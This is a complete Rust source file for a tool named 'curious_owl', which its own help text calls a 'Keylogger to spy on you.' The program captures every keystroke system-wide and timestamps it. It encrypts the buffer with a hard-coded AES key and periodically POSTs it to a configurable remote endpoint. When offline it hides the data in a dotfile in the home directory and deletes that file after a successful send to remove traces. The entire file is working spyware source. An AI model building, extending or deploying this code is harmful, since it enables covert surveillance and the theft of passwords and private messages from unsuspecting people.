// MIT License
//
// Copyright (c) 2024 Max Wiklund
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

use std::env;
use std::fs;
use std::io;
use std::sync::{Arc, Mutex};

use rdev::{listen, EventType, Key as KeyBord};
use reqwest::Client;
use tokio::time::{sleep, Duration, Instant};

use aes_gcm;
use aes_gcm::aead::Aead;
use aes_gcm::aead::Key;
use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
use chrono::Local;
use hex;
use rand::RngCore;

use clap::{Arg, Command};
use serde_json::json;

struct Options {
    endpoint: String,
    tmp_file: String,
    key: &'static [u8],
}

/// Setup cli.
fn cli() -> Command {
    Command::new("curious_owl")
        .about("Keylogger to spy on you.")
        .arg(
            Arg::new("end-point")
                .help("Endpoint to send keystrokes to.")
                .default_value("http://127.0.0.1:5000/endpoint"),
        )
        .arg(
            Arg::new("interval")
                .short('i')
                .help("interval in seconds to send data back.")
                .default_value("10")
                .value_parser(clap::value_parser!(u64)),
        )
}

#[tokio::main]
async fn main() {
    let command = cli();
    let matches = command.get_matches();

    let end_point = matches.get_one::<String>("end-point").unwrap();
    let response_intervals = matches.get_one::<u64>("interval").unwrap().clone();

    let secrets_fp = match get_file_path() {
        Ok(code) => code,
        Err(e) => {
            eprintln!("{e:#}");
            std::process::exit(1);
        }
    };

    let opt = Options {
        endpoint: end_point.to_string(),
        tmp_file: secrets_fp,
        key: b"anexampleverysecurekey1234567890", // Super secret key.
    };

    // Shared buffer to store keystrokes.
    let tex_document_buffer = Arc::new(Mutex::new(String::new()));
    let doc_clone = Arc::clone(&tex_document_buffer);

    // Spawn a task to send requests every 10 seconds
    tokio::spawn(async move {
        loop {
            match send_data(&opt, Arc::clone(&tex_document_buffer)).await {
                Err(e) => {
                    eprintln!("{e:#}");
                }
                _ => {}
            }
            sleep(Duration::from_secs(response_intervals)).await; // Wait for n seconds.
        }
    });

    // Main thread can continue with other work
    listen_for_keystrokes(doc_clone);
}

/// Get temp file with saved keystrokes when no connection found.
fn get_file_path() -> Result<String, String> {
    if cfg!(target_os = "windows") {
        if let Ok(home) = env::var("USERPROFILE") {
            return Ok(home + r"\.curious_owl_secrets.json");
        }
    } else if cfg!(target_os = "macos") || cfg!(target_os = "linux") {
        if let Ok(home) = env::var("HOME") {
            return Ok(home + "/.curious_owl_secrets.json");
        }
    }
    Err("Failed find file path to save secrets in".to_string())
}

fn encrypt_aead(message: &str, app_key: &[u8]) -> (Vec<u8>, Vec<u8>) {
    // Generate a random nonce (12 bytes)
    let mut nonce_bytes = [0u8; 12];
    rand::thread_rng().fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    // Initialize the AES-GCM cipher
    let key = aes_gcm::Key::<Aes256Gcm>::from_slice(app_key); // Explicitly associate the key type
    let cipher = Aes256Gcm::new(key);

    // Encrypt the message
    let ciphertext = cipher
        .encrypt(nonce, message.as_bytes())
        .expect("Encryption failed");

    (nonce_bytes.to_vec(), ciphertext)
}

fn decrypt_aead(nonce: &[u8], ciphertext: &[u8], app_key: &[u8]) -> String {
    let key = Key::<Aes256Gcm>::from_slice(app_key); // Explicitly associate the key type
    let cipher = Aes256Gcm::new(key);
    let nonce = Nonce::from_slice(nonce);

    // Decrypt the message
    let plaintext = cipher
        .decrypt(nonce, ciphertext)
        .expect("Decryption failed");

    String::from_utf8(plaintext).expect("Invalid UTF-8")
}

async fn send_data(opt: &Options, tex_document_buffer: Arc<Mutex<String>>) -> io::Result<()> {
    let mut content_buffer = String::new();
    let fp = &opt.tmp_file;

    // If the file exists then the app has not managed to send the content.
    if fs::metadata(fp).is_ok() {
        // The file exists on disk.
        // Let's read the file and convert to json.
        let json_str = fs::read_to_string(fp)?;
        let jdata: serde_json::Value = serde_json::from_str(&json_str)?;

        // We need both the message and the nonce to decrypt the file. Check it they are there.
        if jdata.get("message").is_some() && jdata.get("nonce").is_some() {
            let nonce = hex::decode(jdata["nonce"].as_str().unwrap()).unwrap();
            let message = hex::decode(jdata["message"].as_str().unwrap()).unwrap();

            // Decrypt the content of the file and add it to the buffer to send.
            content_buffer = decrypt_aead(&nonce, &message, &opt.key)
        }
    }
    {
        // Unlock the document in memory and block access with the mutex.
        let mut doc = tex_document_buffer.lock().unwrap();
        if content_buffer.is_empty() && doc.is_empty() {
            // There is no content to send to the server.
            return Ok(());
        }
        // Push the data in memory to the buffer to send.
        content_buffer.push_str(&doc);
        doc.clear();
    }

    // Encrypt the data.
    let (nonce, ciphertext) = encrypt_aead(&content_buffer.clone(), &opt.key);

    // Payload to send.
    let data = json!({
        "nonce": hex::encode(nonce),
        "message": hex::encode(ciphertext)
    });

    let client = Client::new();
    match client.post(&opt.endpoint).json(&data).send().await {
        Ok(_response) => {
            // We have successfully sent the data to the server let's remove any trance whe where here.
            if fs::metadata(fp).is_ok() {
                // If File exists remove it.
                fs::remove_file(fp)?;
            }
        }
        Err(_e) => {
            // Failed to send data to server save encrypted data to disk.
            println!("Failed to connect");
            fs::write(fp, serde_json::to_string(&data)?)?;
        }
    }
    Ok(())
}

/// Format special key press.
fn format_key(key: KeyBord) -> String {
    format!("[Key:{:#?}]", key)
}

/// Event loop to listen for keystrokes and store them.
fn listen_for_keystrokes(tex_document_buffer: Arc<Mutex<String>>) {
    let now = Local::now();
    let mut timestamp = now.format("%Y%m%d|%H%M").to_string();

    if let Err(error) = listen(move |event| match event.event_type {
        EventType::KeyPress(value) => match value {
            KeyBord::Return => push_key(format_key(value), &tex_document_buffer, &mut timestamp),
            KeyBord::Backspace => push_key(format_key(value), &tex_document_buffer, &mut timestamp),
            KeyBord::PageUp => push_key(format_key(value), &tex_document_buffer, &mut timestamp),
            KeyBord::PageDown => push_key(format_key(value), &tex_document_buffer, &mut timestamp),
            KeyBord::LeftArrow => push_key(format_key(value), &tex_document_buffer, &mut timestamp),
            KeyBord::RightArrow => {
                push_key(format_key(value), &tex_document_buffer, &mut timestamp)
            }
            KeyBord::UpArrow => push_key(format_key(value), &tex_document_buffer, &mut timestamp),
            KeyBord::DownArrow => push_key(format_key(value), &tex_document_buffer, &mut timestamp),
            KeyBord::Tab => push_key(format_key(value), &tex_document_buffer, &mut timestamp),
            KeyBord::ShiftLeft => {}
            KeyBord::ShiftRight => {}
            _ => match event.name {
                Some(string) if !string.is_empty() => {
                    push_key(string, &tex_document_buffer, &mut timestamp)
                }
                _ => push_key(format_key(value), &tex_document_buffer, &mut timestamp),
            },
        },
        _ => {}
    }) {
        println!("Error: {:?}", error);
    }
}

fn push_key(key: String, tex_document_buffer: &Arc<Mutex<String>>, last_time_stamp: &mut String) {
    let now = Local::now();
    let timestamp = now.format("%Y%m%d|%H%M").to_string();
    let new_time = timestamp.clone();

    // access the doc to write data to it.
    let mut doc = tex_document_buffer.lock().unwrap();
    if *timestamp.clone() != *last_time_stamp {
        // TODO: Add application path (Web browser or app.
        // Check if you can store what url?
        doc.push_str(&format!("\n{}|", timestamp.clone()));
    }
    doc.push_str(&key);
    *last_time_stamp = new_time;
}
